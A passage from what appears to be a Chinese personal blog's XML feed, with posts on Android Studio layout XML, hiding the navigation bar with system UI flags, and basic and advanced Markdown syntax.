class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.022&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/title&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#FF99ff&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;80px&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/time&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.01&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>fragment_diary.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/main&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.Fragment.DiaryFragment&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/title&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;45dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;#00000000&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">&quot;0dp&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/change&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_centerInParent</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#FF99ff&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;20dp&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/changeImg&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_alignParentEnd</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_alignParentRight</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_alignParentBottom</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginEnd</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginRight</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginBottom</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;#00000000&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/add_button&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_alignParentEnd</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_alignParentRight</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_alignParentBottom</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginEnd</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginRight</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginBottom</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;#00000000&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;增加&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#FF99ff&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ListView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/listView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_above</span>=<span class="hljs-string">&quot;@+id/add_button&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_below</span>=<span class="hljs-string">&quot;@+id/title&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">&quot;0dp&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>写该app时遇到如下问题</p><ol><li><p>图片无法显示：增加到AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">android:largeHeap=&quot;true&quot;<br>android:hardwareAccelerated=&quot;false&quot;<br></code></pre></div></td></tr></table></figure></li><li><p>隐藏导航栏，相关信息在下一个博客</p></li><li><p>viewPager里面的界面跳转：使用getActivity()就行了</p></li><li><p>图片展示使用Glide</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>项目</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 隐藏导航栏</title>
    <link href="/2021/05/16/AndroidStudio/Android%20Studio%20%E9%9A%90%E8%97%8F%E5%AF%BC%E8%88%AA%E6%A0%8F/"/>
    <url>/2021/05/16/AndroidStudio/Android%20Studio%20%E9%9A%90%E8%97%8F%E5%AF%BC%E8%88%AA%E6%A0%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-隐藏导航栏"><a href="#Android-Studio-隐藏导航栏" class="headerlink" title="Android Studio 隐藏导航栏"></a>Android Studio 隐藏导航栏</h1><h1 id="透明隐藏"><a href="#透明隐藏" class="headerlink" title="透明隐藏"></a>透明隐藏</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">21</span>) &#123;<br>    View decorView = getWindow().getDecorView();<br>    <span class="hljs-keyword">int</span> option = View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE;<br>    decorView.setSystemUiVisibility(option);<br>    getWindow().setStatusBarColor(Color.TRANSPARENT);<br>&#125;<br>ActionBar actionBar = getSupportActionBar();<br>actionBar.hide();<br></code></pre></div></td></tr></table></figure><h1 id="下拉隐藏"><a href="#下拉隐藏" class="headerlink" title="下拉隐藏"></a>下拉隐藏</h1><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jade">public void onWindowFocusChanged(boolean hasFocus) &#123;<br>    super.onWindowFocusChanged(hasFocus);<br>    if (hasFocus &amp;&amp; Build.VERSION.SDK_INT &gt;= 21) &#123;<br>        View decorView = getWindow().getDecorView();<br>        decorView.setSystemUiVisibility(<br>                View.SYSTEM_UI_FLAG_LAYOUT_STABLE<br>                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION<br>                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION<br>                        | View.SYSTEM_UI_FLAG_FULLSCREEN<br>                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><ol><li><p>View.SYSTEM_UI_FLAG_VISIBLE：显示状态栏，Activity不全屏显示(恢复到有状态栏的正常情况)。</p></li><li><p>View.INVISIBLE：隐藏状态栏，同时Activity会伸展全屏显示。</p></li><li><p>View.SYSTEM_UI_FLAG_FULLSCREEN：Activity全屏显示，且状态栏被隐藏覆盖掉。</p></li><li><p>View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN：Activity全屏显示，但状态栏不会被隐藏覆盖，状态栏依然可见，Activity顶端布局部分会被状态遮住。</p></li><li><p>View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION：效果同View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN</p></li><li><p>View.SYSTEM_UI_LAYOUT_FLAGS：效果同View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN</p></li><li><p>View.SYSTEM_UI_FLAG_HIDE_NAVIGATION：隐藏虚拟按键(导航栏)。有些手机会用虚拟按键来代替物理按键。</p></li><li><p>View.SYSTEM_UI_FLAG_LOW_PROFILE：状态栏显示处于低能显示状态(low profile模式)，状态栏上一些图标显示会被隐藏。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown 高级</title>
    <link href="/2021/05/05/Markdown/Markdown%20%E9%AB%98%E7%BA%A7/"/>
    <url>/2021/05/05/Markdown/Markdown%20%E9%AB%98%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="Markdown-高级技巧"><a href="#Markdown-高级技巧" class="headerlink" title="Markdown 高级技巧"></a>Markdown 高级技巧</h1><h3 id="支持的-HTML-元素"><a href="#支持的-HTML-元素" class="headerlink" title="支持的 HTML 元素"></a>支持的 HTML 元素</h3><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。</p><p>目前支持的 HTML 元素有：<code>&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;</code>等 ，如：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">使用 &lt;<span class="hljs-selector-tag">kbd</span>&gt;Ctrl&lt;/<span class="hljs-selector-tag">kbd</span>&gt;+&lt;<span class="hljs-selector-tag">kbd</span>&gt;Alt&lt;/<span class="hljs-selector-tag">kbd</span>&gt;+&lt;<span class="hljs-selector-tag">kbd</span>&gt;<span class="hljs-selector-tag">Del</span>&lt;/<span class="hljs-selector-tag">kbd</span>&gt; 重启电脑<br></code></pre></div></td></tr></table></figure><p>输出结果为：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/81999271-F914-428D-B7BF-164BDC67CAAC.jpg"></p><p>使用<kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd>重启电脑</p><p><b>b</b>  <i>i</i>  <em>em</em>  <sup>sup</sup>  <sub>sub</sub> </p><img width="10%" src="https://ss2.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/baike/pic/item/267f9e2f070828381a14fb78ba99a9014c08f144.jpg" alt="国旗"><audio src="http://121.196.162.32/music/我好想你.flac"><p><video poster="https://nn4cdn.nikkigames.cn/xiaomaoqiu/12443e726c4a8a0cf66e544095e348f9.png" src="https://nn4cdn.nikkigames.cn/xiaomaoqiu/eed662d6fb419a647f5036034c04d8ae.mp4" autoplay="" controls=""></video></p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-strong">**文本加粗**</span> <br>\*\* 正常显示星号 \*\*<br></code></pre></div></td></tr></table></figure><p>输出结果为：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/CA0E0162-0C48-41CD-B57A-CB32A4287C02.jpg" alt="img"></p><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">\   反斜线<br>`   反引号<br><span class="hljs-bullet">*   </span>星号<br>_   下划线<br>&#123;&#125;  花括号<br>[]  方括号<br>()  小括号<br>#   井字号<br>+   加号<br><span class="hljs-bullet">-   </span>减号<br><span class="hljs-bullet">.   </span>英文句点<br>!   感叹号<br></code></pre></div></td></tr></table></figure><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p>当你需要在编辑器中插入数学公式时，可以使用两个美元符 $$ 包裹 TeX 或 LaTeX 格式的数学公式来实现。提交后，问答和文章页会根据需要加载 Mathjax 对数学公式进行渲染。如：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">$$<br>\mathbf&#123;V&#125;<span class="hljs-emphasis">_1 \times \mathbf&#123;V&#125;_</span>2 =  \begin&#123;vmatrix&#125; <br>\mathbf&#123;i&#125; &amp; \mathbf&#123;j&#125; &amp; \mathbf&#123;k&#125; \\<br>\frac&#123;\partial X&#125;&#123;\partial u&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial u&#125; &amp; 0 \\<br>\frac&#123;\partial X&#125;&#123;\partial v&#125; &amp;  \frac&#123;\partial Y&#125;&#123;\partial v&#125; &amp; 0 \\<br>\end&#123;vmatrix&#125;<br>$&#123;$tep1&#125;&#123;\style&#123;visibility:hidden&#125;&#123;(x+1)(x+1)&#125;&#125;<br>$$<br></code></pre></div></td></tr></table></figure><p>输出结果为：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/1061D800-D44C-436D-A1EA-1CBDA95A5209.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown 基础</title>
    <link href="/2021/05/05/Markdown/Markdown%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/05/05/Markdown/Markdown%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="展示一波标题"><a href="#展示一波标题" class="headerlink" title="展示一波标题"></a>展示一波标题</h1><h2 id="第二波二级标题"><a href="#第二波二级标题" class="headerlink" title="第二波二级标题"></a>第二波二级标题</h2><h3 id="使用-号标记"><a href="#使用-号标记" class="headerlink" title="使用 # 号标记"></a>使用 # 号标记</h3><p>使用 # 号可表示 1-6 级标题，一级标题对应一个 # 号，二级标题对应两个 # 号，以此类推。</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-section"># 一级标题</span><br><span class="hljs-section">## 二级标题</span><br><span class="hljs-section">### 三级标题</span><br><span class="hljs-section">#### 四级标题</span><br><span class="hljs-section">##### 五级标题</span><br><span class="hljs-section">###### 六级标题</span><br></code></pre></div></td></tr></table></figure><p>效果如图：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/md2.gif"></p><h2 id="Markdown-段落"><a href="#Markdown-段落" class="headerlink" title="Markdown 段落"></a>Markdown 段落</h2><p>Markdown 段落没有特殊的格式，直接编写文字就好，<strong>段落的换行是使用两个以上空格加上回车</strong>。</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/36A89BDA-A062-4D66-A41B-0EBEE7891AB9.jpg" alt="img"></p><p>当然也可以在段落后面使用一个空行来表示重新开始一个段落。</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/3F254936-778E-417A-BEF2-467116A55D00.jpg" alt="img"></p><p>第一种<br>第二种</p><hr><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>Markdown 可以使用以下几种字体：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-emphasis">*斜体文本*</span><br><span class="hljs-emphasis">_斜体文本_</span><br><span class="hljs-strong">**粗体文本**</span><br><span class="hljs-strong">__粗体文本__</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*粗斜体文本<span class="hljs-strong">**<span class="hljs-emphasis">*</span></span></span></span><br><span class="hljs-emphasis"><span class="hljs-strong"><span class="hljs-emphasis"><span class="hljs-strong"><span class="hljs-strong">__<span class="hljs-emphasis">_粗斜体文本<span class="hljs-strong">__<span class="hljs-emphasis">_</span></span></span></span></span></span></span></span><br></code></pre></div></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/md3.gif" alt="img"></p><p><em>效果</em></p><p><em>效果</em></p><p><strong>效果</strong></p><p><strong>效果</strong></p><p><em><strong>效果</strong></em></p><p><em><strong>效果</strong></em></p><hr><h2 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h2><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-strong">**<span class="hljs-emphasis">*</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"></span></span><br><span class="hljs-emphasis"><span class="hljs-strong">*</span> <span class="hljs-emphasis">* *</span></span><br><span class="hljs-strong"></span><br><span class="hljs-strong">**</span><span class="hljs-strong">**<span class="hljs-emphasis">*</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"></span></span><br><span class="hljs-emphasis"><span class="hljs-strong">- - -</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"></span></span><br><span class="hljs-emphasis"><span class="hljs-strong">----------</span></span><br></code></pre></div></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/3F46EAA9-DADE-48FD-99AA-DF7BEBFAA4FA.jpg" alt="img"></p><hr><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h2><p>如果段落上的文字要添加删除线，只需要在文字的两端加上两个波浪线 ~~ 即可，实例如下：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">GOOGLE.COM<br>~~BAIDU.COM~~<br></code></pre></div></td></tr></table></figure><p>显示效果如下所示：</p><p><del>ok的</del></p><hr><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h2><p>下划线可以通过 HTML 的&lt;u&gt; 标签来实现：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span></span>带下划线文本<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span></span><br></code></pre></div></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/05A27273-B66D-43DE-A3DB-0D32FF024093.jpg" alt="img"></p><p><u>效果</u></p><hr><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><p>脚注是对文本的补充说明。</p><p>Markdown 脚注的格式如下:</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">[^要注明的文本]<br></code></pre></div></td></tr></table></figure><p>以下实例演示了脚注的用法：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">创建脚注格式类似这样 [^练习]。<br><br>[<span class="hljs-symbol">^练习</span>]: <span class="hljs-link">bsms</span><br></code></pre></div></td></tr></table></figure><p>演示效果如下：</p><p>练习[^效果]</p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ul><li>1</li><li>2</li></ul><hr><ul><li>1</li><li>2</li></ul><p>+++++++++++++</p><ul><li>1</li><li>2</li></ul><hr><ul><li><p>第一层</p><ul><li>第二层<ul><li>第三层</li></ul></li></ul></li></ul><h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><blockquote><p>第一层</p><blockquote><p>第二层</p></blockquote></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><div class="hljs code-wrapper"><pre><code>第一种</code></pre></div><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//第二种</span><br></code></pre></div></td></tr></table></figure><h2 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h2><p><a href="www.baidu.com">链接</a></p><p> [^图片]</p><p><img src="https://bkimg.cdn.bcebos.com/pic/4a36acaf2edda3cc7cd9d76304a22e01213fb80e3417?x-bce-process=image/resize,m_lfit,w_268,limit_1/format,f_jpg" alt="图片"></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>Markdown 制作表格使用 